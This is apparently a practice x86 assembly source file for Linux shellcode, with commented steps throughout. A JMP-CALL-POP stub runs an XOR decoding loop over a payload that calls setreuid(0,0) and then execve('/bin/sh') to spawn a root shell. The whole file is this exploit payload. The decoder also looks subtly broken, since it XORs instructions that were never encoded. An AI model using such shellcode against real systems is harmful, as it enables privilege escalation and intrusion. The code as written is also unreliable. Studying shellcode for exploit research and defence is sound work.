BITS 32

global _start

_start:
	jmp short call_point		; 1. JMP to CALL

begin:
	pop esi				; 3. pop shellcode loc into esi for use in encoding
	xor ecx, ecx			; 4. clear ecx
	mov cl, 0x23			; 5. place holder (0x0 for size of shellcode. I changed it to 35 decimal (0x23 hex)

short_xor:
	xor byte[esi], 0x3		; 6. XOR byte from esi with key (0x0=placeholder).  I changed it to  0x3 hex or 11 binary
	inc esi				; 7. increment esi pointer to next byte
	loop short_xor			; 8. repeat to 6 until shellcode is decoded
	jmp short shellcode		; 9. jump over call into decoded shellcode

call_point:
	call begin			; 2. CALL back to begin, push shellcode loc on stack

shellcode:
;setreuid (0,0)
	xor eax, eax			; clear the eax registry, prepare the next line
	mov al, 0x46			; set the syscall value to decimal 70 or hex 46, one byte
	xor ebx, ebx			; clear the ebx register, set to 0
 	xor ecx, ecx			; clear the ecx register, set to 0
	int 0x80			; call kernel to execute the syscall


; spawn shellcode with execve
	xor eax, eax			; clears the eax register, sets to 0
	push eax			; push a null value on the stack, value of eax
	push 0x68732f2f			; push '//sh' onto the stack, padded with leading '/'.  The leading '/' is required for 4 byte alignment and has no effect.
 	push 0x6e69622f			; push /bin onto the stack, notice strings in reverse
    	mov ebx, esp			; since esp now points to "/bin/sh", write to ebx
    	push eax			; eax is still NULL, let's terminate char ** argv on stack
    	push ebx			; still need a pointer to the address of '/bin/sh', use ebx
    	mov ecx, esp			; now esp holds the address of argv, move it to ecx
    	xor edx, edx			; set edx to zero (NULL), not needed
    	mov al, 0xb			; set the syscall # to the decimal 11 or hex b, one byte
    	int 0x80			; call the kernel to execute the syscall

